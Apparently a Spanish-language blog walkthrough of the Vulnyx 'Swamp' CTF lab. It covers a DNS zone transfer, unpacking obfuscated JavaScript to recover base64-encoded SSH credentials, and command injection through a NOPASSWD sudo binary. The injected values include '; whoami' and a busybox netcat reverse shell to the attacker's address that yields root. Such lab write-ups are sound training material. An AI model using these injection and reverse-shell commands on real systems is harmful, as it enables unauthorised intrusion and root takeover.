---
title : "Swamp CTF Walkthrough by loh"
date: 2026-02-03 19:59:21 +0200
categories: [CTF Walkthrough]
tags: [CTF,Walkthrough, Vulnyx, Rustscan, Feroxbuster, DNS Zone Transfer, Javascript Deobfuscation, Binary bypass, sudo -l, NOPASSWD]
---

![Swamp](/assets/post_img/Swamp/logo.png) 

**Comenzamos fuertes este 2026 con una màquina de Vulnyx llamada Swamp. Vamos a ver que nos depara...**


Comenzamos identificando los hosts activos en la red mediante arp-scan, lo que nos permite detectar rápidamente la máquina objetivo dentro del rango proporcionado:

```bash
┌──(kali㉿kali)-[~/CTF/Swamp]
└─$ sudo arp-scan --interface eth0 10.0.5.21/24
[sudo] contraseña para kali: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:69:a8:79, IPv4: 10.0.5.21
WARNING: host part of 10.0.5.21/24 is non-zero
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.5.1        52:54:00:12:35:00       QEMU
10.0.5.2        52:54:00:12:35:00       QEMU
10.0.5.3        08:00:27:86:36:c4       PCS Systemtechnik GmbH
10.0.5.22       08:00:27:b8:8b:4b       PCS Systemtechnik GmbH
```


Entre los resultados observamos un host interesante con IP 10.0.5.22, por lo que comprobamos conectividad con un simple ping, confirmando que la máquina está activa.

```bash
┌──(kali㉿kali)-[~/CTF/Swamp]
└─$ ping 10.0.5.22    
PING 10.0.5.22 (10.0.5.22) 56(84) bytes of data.
64 bytes from 10.0.5.22: icmp_seq=1 ttl=64 time=0.955 ms
64 bytes from 10.0.5.22: icmp_seq=2 ttl=64 time=0.774 ms
64 bytes from 10.0.5.22: icmp_seq=3 ttl=64 time=0.415 ms
^C
--- 10.0.5.22 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2033ms
rtt min/avg/max/mdev = 0.415/0.714/0.955/0.224 ms
```

Una vez identificado el objetivo, procedemos a realizar un escaneo exhaustivo de puertos utilizando rustscan junto con scripts de nmap para enumerar servicios y versiones:

```bash
┌──(kali㉿kali)-[~/CTF/Swamp]
└─$ rustscan -a 10.0.5.22 --ulimit 5000 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.5.22:22
Open 10.0.5.22:53
Open 10.0.5.22:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV" on ip 10.0.5.22
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 19:00 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Initiating ARP Ping Scan at 19:00
Scanning 10.0.5.22 [1 port]
Completed ARP Ping Scan at 19:00, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:00
Completed Parallel DNS resolution of 1 host. at 19:00, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:00
Scanning 10.0.5.22 [3 ports]
Discovered open port 22/tcp on 10.0.5.22
Discovered open port 80/tcp on 10.0.5.22
Discovered open port 53/tcp on 10.0.5.22
Completed SYN Stealth Scan at 19:00, 0.02s elapsed (3 total ports)
Initiating Service scan at 19:00
Scanning 3 services on 10.0.5.22
Completed Service scan at 19:00, 6.03s elapsed (3 services on 1 host)
NSE: Script scanning 10.0.5.22.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 8.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Nmap scan report for 10.0.5.22
Host is up, received arp-response (0.00048s latency).
Scanned at 2026-01-27 19:00:15 CET for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA66jQuAvL9WHltK0kjZyYOD/WZIeC/9k5OsLp+Z9c/jSyrVCkKOjczJiEk4CgQ2PJs12Y7mvCzZLCCXcEte2NU=
|   256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILb6SXvYxgDDUn0+9hqqpqs7qIS8e0PfKKE7/aDWNdCR
53/tcp open  domain  syn-ack ttl 64 ISC BIND 9.18.28-1~deb12u2 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-1~deb12u2-Debian
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://swamp.nyx
MAC Address: 08:00:27:B8:8B:4B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds
           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)
```

Del escaneo destacamos:
- 22/tcp → SSH (OpenSSH 9.2p1)
- 53/tcp → DNS (ISC BIND)
- 80/tcp → HTTP (Apache)

Además, el servicio web redirige a un dominio que no resuelve por defecto: `http://swamp.nyx`.

Dado que el puerto 53 está abierto, probamos una transferencia de zona DNS (AXFR), la cual resulta ser exitosa:

```bash
┌──(kali㉿kali)-[~/CTF/Swamp]
└─$ dig axfr swamp.nyx @10.0.5.22     

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr swamp.nyx @10.0.5.22
;; global options: +cmd
swamp.nyx.              604800  IN      SOA     ns1.swamp.nyx. . 2025010401 604800 86400 2419200 604800
swamp.nyx.              604800  IN      NS      ns1.swamp.nyx.
d0nkey.swamp.nyx.       604800  IN      A       0.0.0.0
dr4gon.swamp.nyx.       604800  IN      A       0.0.0.0
duloc.swamp.nyx.        604800  IN      A       0.0.0.0
f1ona.swamp.nyx.        604800  IN      A       0.0.0.0
farfaraway.swamp.nyx.   604800  IN      A       0.0.0.0
ns1.swamp.nyx.          604800  IN      A       0.0.0.0
shr3k.swamp.nyx.        604800  IN      A       0.0.0.0
swamp.nyx.              604800  IN      SOA     ns1.swamp.nyx. . 2025010401 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 10.0.5.22#53(10.0.5.22) (TCP)
;; WHEN: Tue Jan 27 19:05:24 CET 2026
;; XFR size: 10 records (messages 1, bytes 309)
```

Esto nos devuelve múltiples subdominios interesantes como:
- farfaraway.swamp.nyx
- shr3k.swamp.nyx
- d0nkey.swamp.nyx

Para poder resolverlos correctamente, los añadimos al fichero /etc/hosts:

```bash
┌──(kali㉿kali)-[~/CTF/Swamp]
└─$ cat /etc/hosts                                               
127.0.0.1       localhost
127.0.1.1       kali
10.0.5.22       swamp.nyx d0nkey.swamp.nyx dr4gon.swamp.nyx duloc.swamp.nyx f1ona.swamp.nyx farfaraway.swamp.nyx ns1.swamp.nyx shr3k.swamp.nyx
```


Accediendo vía web al subdominio farfaraway.swamp.nyx, encontramos un archivo JavaScript minimizado y ofuscado:

```bash
┌──(kali㉿kali)-[~/CTF/Swamp]
└─$ curl -X GET "http://farfaraway.swamp.nyx/script.min.js" 
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('!M(){1C e;9 1D((e,t)=>{11(()=>{e("1y z 1z: 5")},1L)}).1I(e=>{6.7(e)}).1j(e=>{6.F(e)});8 t=1G e=>{1M{8 t=1g(1g 1l(e)).1p();6.7("1q 1l 2c:",t)}1j(o){6.F("1k 27 1d:",o)}};t("2d://2k.2h.2f/2g"),(()=>{8 e=k.26("1S");e.1T="1P 1V 22 R J 23",k.2b.1X(e)})();1W o{1Y(e,t){B.j=e,B.Q=t}C(){6.7(`${B.j}1Z:${B.Q}`)}}8 a=9 o("1O","1Q"),l=9 o("1R","24");a.C(),l.C();8 r=[1,2,3,4,5],n=r.2i(e=>2*e);6.7("2j 17:",n);8 s=r.2e((e,t)=>e+t,0);6.7("28 1i 17:",s);6.7("29 q:",{j:"T",b:30,2a:"1N"}),2l(()=>{6.7("12 1H 1r 1s 2 Z")},1t),k.1u("1v",()=>{6.7("1m 1o 1n J k")});8 g=9 14;6.7("1w W:",g.Y());8 i=9 14(g.1J()+1,g.1K(),g.1F());6.7("1E W:",i.Y());8 c=e=>{e%2==0?6.7(e+" z 1x"):6.7(e+" z 1A")};[10,21,32,1B,1U].V(c),11(()=>{6.7("12 2V 2W 3 Z")},2X);(e=>{8 t=e(10,20);6.7("2N 1c 2P-2R M:",t)})((e,t)=>e+t);8{X:d,13:u,b:h}={X:"31",13:"33",b:25};6.7(`2m:${d}${u},36:${h}`);8 m=9 19;m.N("j","G"),m.N("b",30),m.N("K","1b 1b 37"),6.7("19 15:"),m.V((e,t)=>{6.7(t+": "+e)});8 p=9 18([1,2,3,4,4,5]);6.7("18 15 (2u 2v):",2x.1c(p));8 $=M*e(){E"2s D",E"2p D",E"2q D"}();6.7($.H().A),6.7($.H().A),6.7($.H().A);6.7("2r, T! 2H R J 2I.");2K:2G;8 f=x.1h(\'{"j":"G","b":30}\');6.7("2F x 1d:",f),"O"1e U?U.O.2B(e=>{6.7("2A 2C K:",e.P.2D,e.P.2E)},e=>{6.F("1k 2L K:",e)}):6.7("2J 2z 2y");8 v="    2n z 2o!   ",y=v.2t();6.7("2w 1f:",y);8 S=v.2M();6.7("2Z 1f:",S),I.35("q",x.34({j:"G",b:30}));8 w=x.1h(I.38("q"));6.7("39 q 1e I:",w),6.7("2Q 2O:",L.2S()),6.7("2T 2Y 1i 16:",L.2U(16)),6.7("1a A:",L.1a)}();',62,196,'||||||console|log|let|new||age||||||||name|document||||||user|||||||JSON||is|value|this|speak|part|yield|error|Shrek|next|localStorage|the|location|Math|function|set|geolocation|coords|sound|to||John|navigator|forEach|date|firstName|toString|seconds||setTimeout|This|lastName|Date|values||numbers|Set|Map|PI|Far|from|data|in|string|await|parse|of|catch|Error|fetch|Click|on|detected|json|Data|repeats|every|2e3|addEventListener|click|Current|even|Value|positive|odd|43|var|Promise|Future|getDate|async|message|then|getFullYear|getMonth|1e3|try|USA|Dog|Dynamically|Woof|Cat|div|innerHTML|54|added|class|appendChild|constructor|says|||text|DOM|Meow||createElement|fetching|Sum|Updated|country|body|success|https|reduce|com|posts|typicode|map|Doubled|jsonplaceholder|setInterval|Destructuring|JavaScript|fun|Second|Third|Hello|First|trim|no|duplicates|Trimmed|Array|available|not|Your|getCurrentPosition|current|latitude|longitude|Parsed|c2hyZWs6cHV0b3Blc2FvZWxhc25v|Welcome|page|Geolocation|Password|getting|toUpperCase|Result|number|higher|Random|order|random|Square|sqrt|runs|after|3e3|root|Uppercase||Jane||Doe|stringify|setItem|Age|Away|getItem|Stored'.split('|'),0,{}))
```


El contenido utiliza un wrapper típico `eval(function(p,a,c,k,e,d){...})`, lo que nos hace sospechar de JavaScript empaquetado.


En primer lugar, pasamos el código por [js-beautify](https://beautifier.io/) para mejorar la legibilidad:
![Beautifier](/assets/post_img/Swamp/beautifier.png) 

Posteriormente, utilizamos [UnPacker](https://matthewfl.com/unPacker.html) para desempaquetar completamente el script y obtener el código original:
![Unpacker](/assets/post_img/Swamp/unpacker.png) 

Una vez desempaquetado, guardamos el resultado y buscamos strings interesantes, encontrando una contraseña codificada en Base64:

```bash
┌──(kali㉿kali)-[~/CTF/Swamp/content]
└─$ cat unpacked.js | grep "Password"
        Password:c2hyZWs6cHV0b3Blc2FvZWxhc25v;
```
Decodificamos el string, obteniendo credenciales claras: `shrek:putopesaoelasno`.

```bash
┌──(kali㉿kali)-[~/CTF/Swamp/content]
└─$ echo -n "c2hyZWs6cHV0b3Blc2FvZWxhc25v" | base64 -d
shrek:putopesaoelasno                                    
```

Con las credenciales obtenidas, accedemos al sistema vía SSH sin problemas y comprobamos los privilegios sudo del usuario shrek. Vemos que el usuario puede ejecutar sin contraseña el binario:
`/home/shrek/header_checker`.
```bash
┌──(kali㉿kali)-[~/CTF/Swamp/content]
└─$ ssh shrek@10.0.5.22   
The authenticity of host '10.0.5.22 (10.0.5.22)' can't be established.
ED25519 key fingerprint is SHA256:q2oJVk8pvyNE1iEAucoSG9iwm1MeIlnMRT7L9fXkqzI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.5.22' (ED25519) to the list of known hosts.
shrek@10.0.5.22's password: 
Linux swamp 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 13:12:39 2025 from 192.168.1.33
shrek@swamp:~$ sudo -l
Matching Defaults entries for shrek on swamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shrek may run the following commands on swamp:
    (ALL) NOPASSWD: /home/shrek/header_checker
```

Probamos su funcionamiento normal y observamos que acepta una URL como parámetro. Al probar a inyectar comandos en el parámetro --url, comprobamos que no hay sanitización, permitiendo command injection:

```bash
shrek@swamp:~$ sudo /home/shrek/header_checker --url "amazon.com; whoami"
Fetching response headers from: amazon.com; whoami
Timeout: 10 seconds
HTTP Method: GET
Custom Headers: 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0   163    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
Response Headers:
HTTP/1.1 301 Moved Permanently
Server: Server
Date: Tue, 27 Jan 2026 18:36:00 GMT
Content-Type: text/html
Content-Length: 163
Connection: keep-alive
Location: https://amazon.com/

root
```
El comando se ejecuta como root, confirmando la vulnerabilidad.

Dado que nc no está instalado, revisamos alternativas y encontramos que busybox incluye netcat:

```bash
shrek@swamp:~$ command nc -v
-bash: nc: command not found

shrek@swamp:~$ busybox --list | grep -E "nc|netcat|telnet|wget|sh"
ash
nc
sh
sha1sum
sha256sum
sha3sum
sha512sum
shred
shuf
sync
telnet
truncate
uncompress
unshare
uuencode
wget
```

Levantamos un listener en nuestra máquina atacante:

```bash
(kali@kali)-[~/CTF/Swamp]
$ penelope -p 1234
[+] Listening for reverse shells on 0.0.0.0:1234 -> 127.0.0.1 • 10.0.5.21 • 172.18.0.1 • 172.20.0.1 • 172.17.0.1 • 172.21.0.1 • 172.19.0.1
[>] Main Menu (m) Payloads (p) Clear (Ctrl-L) Quit (q/Ctrl-C)
```


Y lanzamos una reverse shell como root usando el binario vulnerable:

```bash
shrek@swamp:~$ sudo /home/shrek/header_checker --url "amazon.com; busybox nc 10.0.5.21 1234 -e sh"
Fetching response headers from: amazon.com; busybox nc 10.0.5.21 1234 -e sh
Timeout: 10 seconds
HTTP Method: GET
Custom Headers:
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
  0   163    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

Response Headers:
HTTP/1.1 301 Moved Permanently
Server: Server
Date: Tue, 27 Jan 2026 18:56:26 GMT
Content-Type: text/html
Content-Length: 163
Connection: keep-alive
Location: https://amazon.com/
```


Recibimos correctamente la shell root ya estabilizada gracias a Penelope, ¡y obtenemos finalmente la root flag!

```bash
(kali@kali)-[~/CTF/Swamp]
$ penelope -p 1234
[+] Listening for reverse shells on 0.0.0.0:1234 -> 127.0.0.1 • 10.0.5.21 • 172.18.0.1 • 172.20.0.1 • 172.17.0.1 • 172.21.0.1 • 172.19.0.1
[>] Main Menu (m) Payloads (p) Clear (Ctrl-L) Quit (q/Ctrl-C)
[+] Got reverse shell from swamp@10.0.5.22 linux-x86_64 😈 Assigned SessionID <1>
[!] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[!] Attempting to spawn a reverse shell on 10.0.5.21:1234
[+] Got reverse shell from swamp@10.0.5.22 linux-x86_64 😈 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/script! 🎉
[*] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/swamp-10.0.5.22-linux-x86_64/2026_01_27-19_56_27-290.log 📄

id
uid=0(root) gid=0(root) groups=0(root)
root@swamp:/home/shrek# cd /root/
root@swamp:~# ls
root.txt
root@swamp:~# cat root.txt
9c7b......
```

¿Cómo habéis visto esta CTF? Personalmente, me ha gustado mucho, tocando las zonas de transferencia del DNS que para mí era algo nuevo. Gracias al creador Jackie0x17 y a mi profesor por descubrir esta máquina.

Hasta la próxima,

~loh♡.


